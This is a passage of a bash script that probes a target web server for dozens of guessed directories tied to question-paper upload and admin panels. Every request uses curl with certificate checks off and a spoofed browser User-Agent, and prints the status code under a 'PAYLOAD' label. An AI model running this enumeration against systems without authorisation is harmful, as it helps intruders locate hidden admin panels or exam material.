payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBatch_DataUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBatch_DataUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBFileAutoUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBFileAutoUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchUpload_QPAuto/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchUpload_QPAuto/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QsnPaper-Uploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QsnPaper-Uploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["PlatformQPMaster/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"PlatformQPMaster/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Automation-QPBulk/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Automation-QPBulk/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataUploadExamPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataUploadExamPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MonitoringToolQPBFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MonitoringToolQPBFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutomationSystemQPMonitor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutomationSystemQPMonitor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataProcessing-QPMgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataProcessing-QPMgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPCloud-Panel/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPCloud-Panel/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPDatabaseAccessControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPDatabaseAccessControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ManagementQPService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ManagementQPService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["CloudSync-QPBulk/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"CloudSync-QPBulk/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Sync_QsnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Sync_QsnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Workflow-TestPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Workflow-TestPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingSystem-QPAuto/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingSystem-QPAuto/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMonitor-Manager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMonitor-Manager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPManager-Tool/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPManager-Tool/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["TestPaper_DataSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"TestPaper_DataSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Workflow-QPHandler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Workflow-QPHandler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["SuiteQPUploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"SuiteQPUploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["UploadService_QPUploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"UploadService_QPUploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QP_FileUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QP_FileUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingSystem_QstnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingSystem_QstnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPHandler_ProcessingSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPHandler_ProcessingSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ControlQPSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ControlQPSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Manager-QPFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Manager-QPFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPProcessingControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPProcessingControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploadSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploadSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Handler_QPMgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Handler_QPMgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaperBatchUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaperBatchUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QuestionPaper_Ops/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QuestionPaper_Ops/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaperWorkflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaperWorkflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPWorkflow-Panel/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPWorkflow-Panel/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QsnPaper-BulkUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QsnPaper-BulkUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPCloudHandlingModule/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPCloudHandlingModule/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AccessControl-QPProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AccessControl-QPProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPControl-Panel/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPControl-Panel/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPHandlerAutomationSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPHandlerAutomationSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MonitoringTool_QPHandler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MonitoringTool_QPHandler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MgmtQPAuto/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MgmtQPAuto/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Admin-QPUploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Admin-QPUploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Dashboard-QPFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Dashboard-QPFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Workflow_QPHandler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Workflow_QPHandler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMaster_Monitoring/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMaster_Monitoring/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAdminUploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAdminUploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Handler-QPB/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Handler-QPB/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Handling-QPB/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Handling-QPB/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBFile-DataPipeline/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBFile-DataPipeline/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPDatabase-BatchProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPDatabase-BatchProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MonitoringTool-QPBulk/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MonitoringTool-QPBulk/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DatabaseManagerQPUploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DatabaseManagerQPUploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["TestPaperControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"TestPaperControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPDatabase-Module/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPDatabase-Module/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

